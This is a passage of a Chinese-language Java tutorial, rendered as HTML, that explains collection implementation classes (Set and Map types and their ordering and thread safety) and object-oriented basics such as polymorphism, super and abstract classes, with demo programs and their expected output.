尾部添加（普通添加方法）</span></span><br><span class="line">        linkedList.add(<span class="number">20</span>);</span><br><span class="line">        linkedList.addFirst(<span class="number">5</span>); <span class="comment">// 特有方法：头部添加（高效，对应“插入删除快”）</span></span><br><span class="line">        linkedList.addLast(<span class="number">25</span>); <span class="comment">// 特有方法：尾部添加（高效）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;初始LinkedList：&quot;</span> + linkedList);</span><br><span class="line">        <span class="comment">// 运行结果：初始LinkedList：[5, 10, 20, 25]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 核心优势：频繁增删（头部、尾部、指定位置，效率高于ArrayList）</span></span><br><span class="line">        linkedList.add(<span class="number">2</span>, <span class="number">15</span>); <span class="comment">// 在索引2的位置插入15（高效）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;索引2插入15后：&quot;</span> + linkedList);</span><br><span class="line">        <span class="comment">// 运行结果：索引2插入15后：[5, 10, 15, 20, 25]</span></span><br><span class="line"></span><br><span class="line">        linkedList.removeFirst(); <span class="comment">// 特有方法：删除头部元素（高效）</span></span><br><span class="line">        linkedList.removeLast(); <span class="comment">// 特有方法：删除尾部元素（高效）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;删除头尾元素后：&quot;</span> + linkedList);</span><br><span class="line">        <span class="comment">// 运行结果：删除头尾元素后：[10, 15, 20]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 查询元素（通过索引查询，效率低，对应表格“随机访问慢”，不推荐频繁使用）</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">element</span> <span class="operator">=</span> linkedList.get(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;索引1的元素：&quot;</span> + element);</span><br><span class="line">        <span class="comment">// 运行结果：索引1的元素：15</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 遍历集合（推荐增强for循环，避免索引查询，适配LinkedList特性）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;增强for循环遍历（适配LinkedList增删特性）：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Integer num : linkedList) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 运行结果：</span></span><br><span class="line">        <span class="comment">// 10</span></span><br><span class="line">        <span class="comment">// 15</span></span><br><span class="line">        <span class="comment">// 20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-Set实现类"><a href="#2-Set实现类" class="headerlink" title="(2) Set实现类"></a>(2) Set实现类</h4><table>
<thead>
<tr>
<th>类型</th>
<th>底层结构</th>
<th>排序特性</th>
<th>线程安全</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td><strong>HashSet</strong></td>
<td>HashMap</td>
<td>无序</td>
<td>❌</td>
<td>通过hashCode()快速查找</td>
</tr>
<tr>
<td><strong>LinkedHashSet</strong></td>
<td>LinkedHashMap</td>
<td>插入顺序</td>
<td>❌</td>
<td>保持插入顺序</td>
</tr>
<tr>
<td><strong>TreeSet</strong></td>
<td>TreeMap</td>
<td>自然排序</td>
<td>❌</td>
<td>通过红黑树实现</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>HashSet：无序、去重（底层 HashMap）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSetDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建HashSet对象，存储字符串类型</span></span><br><span class="line">        Set&lt;String&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 添加元素（包含重复元素，演示去重特性）</span></span><br><span class="line">        hashSet.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;Java&quot;</span>); <span class="comment">// 重复元素，添加失败</span></span><br><span class="line">        hashSet.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;Go&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 打印集合（无序，且无重复元素“Java”）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;HashSet元素（无序+去重）：&quot;</span> + hashSet);</span><br><span class="line">        <span class="comment">// 运行结果（顺序不固定，示例参考）：HashSet元素（无序+去重）：[Java, Python, C++, Go]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 常用操作：判断元素是否存在、删除元素</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">hasPython</span> <span class="operator">=</span> hashSet.contains(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        hashSet.remove(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;是否包含Python：&quot;</span> + hasPython);</span><br><span class="line">        System.out.println(<span class="string">&quot;删除C++后HashSet：&quot;</span> + hashSet);</span><br><span class="line">        <span class="comment">// 运行结果：</span></span><br><span class="line">        <span class="comment">// 是否包含Python：true</span></span><br><span class="line">        <span class="comment">// 删除C++后HashSet：[Java, Python, Go]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>LinkedHashSet：保持插入顺序、去重（底层 LinkedHashMap）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedHashSetDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建LinkedHashSet对象</span></span><br><span class="line">        Set&lt;String&gt; linkedHashSet = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 按顺序添加元素（包含重复元素）</span></span><br><span class="line">        linkedHashSet.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        linkedHashSet.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        linkedHashSet.add(<span class="string">&quot;Java&quot;</span>); <span class="comment">// 重复元素，添加失败</span></span><br><span class="line">        linkedHashSet.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">        linkedHashSet.add(<span class="string">&quot;Go&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 打印集合（与插入顺序完全一致，且去重）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;LinkedHashSet元素（插入顺序+去重）：&quot;</span> + linkedHashSet);</span><br><span class="line">        <span class="comment">// 运行结果（顺序固定）：LinkedHashSet元素（插入顺序+去重）：[Java, Python, C++, Go]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 遍历集合（顺序与插入一致）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;遍历LinkedHashSet（保持插入顺序）：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String str : linkedHashSet) &#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 运行结果：Java -&gt; Python -&gt; C++ -&gt; Go（与插入顺序一致）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>TreeSet：自然排序、去重（底层 TreeMap，红黑树）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSetDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 示例1：存储整数，自然排序（升序）</span></span><br><span class="line">        Set&lt;Integer&gt; numTreeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;();</span><br><span class="line">        numTreeSet.add(<span class="number">30</span>);</span><br><span class="line">        numTreeSet.add(<span class="number">10</span>);</span><br><span class="line">        numTreeSet.add(<span class="number">20</span>);</span><br><span class="line">        numTreeSet.add(<span class="number">30</span>); <span class="comment">// 重复元素，添加失败</span></span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet整数（自然升序+去重）：&quot;</span> + numTreeSet);</span><br><span class="line">        <span class="comment">// 运行结果（固定升序）：TreeSet整数（自然升序+去重）：[10, 20, 30]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 示例2：存储字符串，自然排序（字典序）</span></span><br><span class="line">        Set&lt;String&gt; strTreeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;();</span><br><span class="line">        strTreeSet.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        strTreeSet.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        strTreeSet.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">        strTreeSet.add(<span class="string">&quot;Go&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet字符串（字典序+去重）：&quot;</span> + strTreeSet);</span><br><span class="line">        <span class="comment">// 运行结果（固定字典序）：TreeSet字符串（字典序+去重）：[C++, Go, Java, Python]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-Map实现类"><a href="#3-Map实现类" class="headerlink" title="(3) Map实现类"></a>(3) Map实现类</h4><table>
<thead>
<tr>
<th>类型</th>
<th>底层结构</th>
<th>扩容机制</th>
<th>线程安全</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td><strong>HashMap</strong></td>
<td>数组+链表+红黑树</td>
<td>2倍扩容</td>
<td>❌</td>
<td>最常用Map</td>
</tr>
<tr>
<td><strong>Hashtable</strong></td>
<td>数组+链表</td>
<td>2倍扩容</td>
<td>✅</td>
<td>同步，已过时</td>
</tr>
<tr>
<td><strong>ConcurrentHashMap</strong></td>
<td>分段锁（JDK7）<br>CAS+synchronized（JDK8）</td>
<td>2倍扩容</td>
<td>✅</td>
<td>高并发场景</td>
</tr>
<tr>
<td><strong>TreeMap</strong></td>
<td>红黑树</td>
<td>无</td>
<td>❌</td>
<td>按键排序</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>HashMap：最常用、无序、非线程安全（底层数组 + 链表 + 红黑树）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建HashMap对象，键：字符串（姓名），值：整数（年龄）</span></span><br><span class="line">        Map&lt;String, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 添加键值对（增）</span></span><br><span class="line">        hashMap.put(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;李四&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;王五&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;张三&quot;</span>, <span class="number">26</span>); <span class="comment">// 重复键，覆盖原有值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 获取值（查）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">zhangSanAge</span> <span class="operator">=</span> hashMap.get(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;张三的年龄：&quot;</span> + zhangSanAge);</span><br><span class="line">        <span class="comment">// 运行结果：张三的年龄：26（已覆盖原有值25）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 打印Map（无序存储）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;HashMap键值对（无序）：&quot;</span> + hashMap);</span><br><span class="line">        <span class="comment">// 运行结果（顺序不固定）：HashMap键值对（无序）：&#123;张三=26, 李四=30, 王五=28&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 修改值（改）</span></span><br><span class="line">        hashMap.put(<span class="string">&quot;李四&quot;</span>, <span class="number">31</span>);</span><br><span class="line">        <span class="comment">// 6. 删除键值对（删）</span></span><br><span class="line">        hashMap.remove(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;修改+删除后HashMap：&quot;</span> + hashMap);</span><br><span class="line">        <span class="comment">// 运行结果：修改+删除后HashMap：&#123;张三=26, 李四=31&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 遍历Map</span></span><br><span class="line">        System.out.println(<span class="string">&quot;遍历HashMap：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : hashMap.entrySet()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;键：&quot;</span> + entry.getKey() + <span class="string">&quot;，值：&quot;</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Hashtable：线程安全、已过时（底层数组 + 链表）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashtableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建Hashtable对象</span></span><br><span class="line">        Map&lt;String, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 添加键值对（用法与HashMap类似）</span></span><br><span class="line">        hashtable.put(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        hashtable.put(<span class="string">&quot;李四&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        hashtable.put(<span class="string">&quot;王五&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        hashtable.put(<span class="string">&quot;张三&quot;</span>, <span class="number">26</span>); <span class="comment">// 重复键，覆盖值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 打印Hashtable（无序）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hashtable键值对（线程安全+无序）：&quot;</span> + hashtable);</span><br><span class="line">        <span class="comment">// 运行结果：Hashtable键值对（线程安全+无序）：&#123;李四=30, 张三=26, 王五=28&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 关键提醒：Hashtable已过时，不推荐使用，性能远低于ConcurrentHashMap</span></span><br><span class="line">        System.out.println(<span class="string">&quot;注意：Hashtable已过时，优先使用ConcurrentHashMap实现线程安全Map&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ConcurrentHashMap：高并发、线程安全（JDK8：CAS+synchronized）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">import</span> java.util.Map;</span><br><span class="line">  <span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcurrentHashMapDemo</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">          <span class="comment">// 1. 创建ConcurrentHashMap对象</span></span><br><span class="line">          Map&lt;String, Integer&gt; concurrentHashMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 2. 演示多线程写入（体现高并发安全特性）</span></span><br><span class="line">          <span class="type">Runnable</span> <span class="variable">task</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">              <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">                  <span class="comment">// 并发写入，不会出现线程安全问题（如数据丢失、异常）</span></span><br><span class="line">                  concurrentHashMap.put(Thread.currentThread().getName() + <span class="string">&quot;-&quot;</span> + i, i);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 3. 启动2个线程并发写入</span></span><br><span class="line">          <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(task, <span class="string">&quot;线程1&quot;</span>);</span><br><span class="line">          <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(task, <span class="string">&quot;线程2&quot;</span>);</span><br><span class="line">          t1.start();</span><br><span class="line">          t2.start();</span><br><span class="line">          t1.join();</span><br><span class="line">          t2.join();</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 4. 打印元素个数（应为2000个，无数据丢失）</span></span><br><span class="line">          System.out.println(<span class="string">&quot;ConcurrentHashMap元素个数（并发写入无丢失）：&quot;</span> + concurrentHashMap.size());</span><br><span class="line">          <span class="comment">// 运行结果：ConcurrentHashMap元素个数（并发写入无丢失）：2000</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// 5. 普通增删改查（用法与HashMap一致）</span></span><br><span class="line">          concurrentHashMap.put(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line">          System.out.println(<span class="string">&quot;张三的年龄：&quot;</span> + concurrentHashMap.get(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">          <span class="comment">// 运行结果：张三的年龄：25</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line">- **TreeMap：按键自然排序、非线程安全（底层红黑树）** </span><br><span class="line">  ```java</span><br><span class="line">  <span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line">  <span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeMapDemo</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          <span class="comment">// 1. 创建TreeMap对象，键：字符串（姓名），值：整数（年龄）</span></span><br><span class="line">          Map&lt;String, Integer&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 2. 添加键值对（键为字符串，按字典序排序）</span></span><br><span class="line">          treeMap.put(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line">          treeMap.put(<span class="string">&quot;李四&quot;</span>, <span class="number">30</span>);</span><br><span class="line">          treeMap.put(<span class="string">&quot;王五&quot;</span>, <span class="number">28</span>);</span><br><span class="line">          treeMap.put(<span class="string">&quot;赵六&quot;</span>, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 3. 打印TreeMap（按键自然排序：字典序）</span></span><br><span class="line">          System.out.println(<span class="string">&quot;TreeMap键值对（按键字典序排序）：&quot;</span> + treeMap);</span><br><span class="line">          <span class="comment">// 运行结果（固定字典序）：TreeMap键值对（按键字典序排序）：&#123;李四=30, 王五=28, 张三=25, 赵六=35&#125;</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// 4. 遍历TreeMap（按键升序遍历）</span></span><br><span class="line">          System.out.println(<span class="string">&quot;遍历TreeMap（按键排序）：&quot;</span>);</span><br><span class="line">          <span class="keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : treeMap.entrySet()) &#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;键：&quot;</span> + entry.getKey() + <span class="string">&quot;，值：&quot;</span> + entry.getValue());</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 示例2：键为整数，按升序排序</span></span><br><span class="line">          Map&lt;Integer, String&gt; numTreeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">          numTreeMap.put(<span class="number">3</span>, <span class="string">&quot;C++&quot;</span>);</span><br><span class="line">          numTreeMap.put(<span class="number">1</span>, <span class="string">&quot;Java&quot;</span>);</span><br><span class="line">          numTreeMap.put(<span class="number">2</span>, <span class="string">&quot;Python&quot;</span>);</span><br><span class="line">          System.out.println(<span class="string">&quot;TreeMap（键为整数，升序排序）：&quot;</span> + numTreeMap);</span><br><span class="line">          <span class="comment">// 运行结果：TreeMap（键为整数，升序排序）：&#123;1=Java, 2=Python, 3=C++&#125;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="5-总结"><a href="#5-总结" class="headerlink" title="(5)总结"></a>(5)总结</h4><table>
<thead>
<tr>
<th>实现类</th>
<th>核心特性体现</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>HashSet</td>
<td>无序、去重</td>
<td>无需有序存储，仅需去重</td>
</tr>
<tr>
<td>LinkedHashSet</td>
<td>插入顺序、去重</td>
<td>需要保留插入顺序且去重</td>
</tr>
<tr>
<td>TreeSet</td>
<td>自然排序、去重</td>
<td>需要有序存储且去重</td>
</tr>
<tr>
<td>HashMap</td>
<td>高效、无序、非线程安全</td>
<td>普通场景（单线程&#x2F;无并发）的键值对存储</td>
</tr>
<tr>
<td>Hashtable</td>
<td>线程安全、性能差、已过时</td>
<td>兼容旧系统，不推荐新开发使用</td>
</tr>
<tr>
<td>ConcurrentHashMap</td>
<td>高并发、线程安全、性能优异</td>
<td>多线程并发写入&#x2F;读取的场景</td>
</tr>
<tr>
<td>TreeMap</td>
<td>按键自然排序、非线程安全</td>
<td>需要按键盘序遍历的键值对存储</td>
</tr>
</tbody></table>
<h2 id="五、面向对象深度解析"><a href="#五、面向对象深度解析" class="headerlink" title="五、面向对象深度解析"></a>五、面向对象深度解析</h2><h3 id="1-继承与多态"><a href="#1-继承与多态" class="headerlink" title="1. 继承与多态"></a>1. 继承与多态</h3><ul>
<li><p><strong>多态实现原理</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123; </span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span> &#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Animal&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123; </span><br><span class="line">  <span class="meta">@Override</span> </span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span> &#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Woof&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">a.sound(); <span class="comment">// 输出&quot;Woof&quot;（动态绑定）</span></span><br></pre></td></tr></table></figure>
<ul>
<li>JVM通过<strong>虚方法表（vtable）</strong> 实现</li>
<li>每个类有虚方法表，指向实际方法地址</li>
</ul>
</li>
<li><p><strong>super关键字详解</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    Parent(String name) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    Child() &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;Child&quot;</span>); <span class="comment">// 必须在第一行调用父类构造器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Override与super关键字</strong></p>
<ul>
<li><p><strong>Override</strong>：子类重写父类方法，必须与父类方法签名一致（返回值类型、方法名、参数列表）</p>
</li>
<li><p><strong>super</strong>：调用父类方法或构造器，必须在子类方法第一行（构造器中）</p>
</li>
<li><p><strong>示例代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类：定义基础方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 父类的问候方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;父类（Person）：你好！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类：继承父类，并重写方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 使用 @Override 注解标注此方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 2. 使用 super 关键字调用父类的 sayHello() 方法</span></span><br><span class="line">        <span class="built_in">super</span>.sayHello();</span><br><span class="line">        <span class="comment">// 子类自己的扩展逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;子类（Student）：我是一名学生！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OverrideAndSuperDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.sayHello(); <span class="comment">// 调用子类重写后的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">实际上是可以删除 <span class="meta">@Override</span> 注解的，因为它不是强制要求的。</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="2-抽象类"><a href="#2-抽象类" class="headerlink" title="2. 抽象类"></a>2. 抽象类</h3><ul>
<li><p><strong>抽象类定义</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="comment">// 抽象方法（无实现）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 具体方法（有实现）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Woof&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>知识点</strong>：</p>
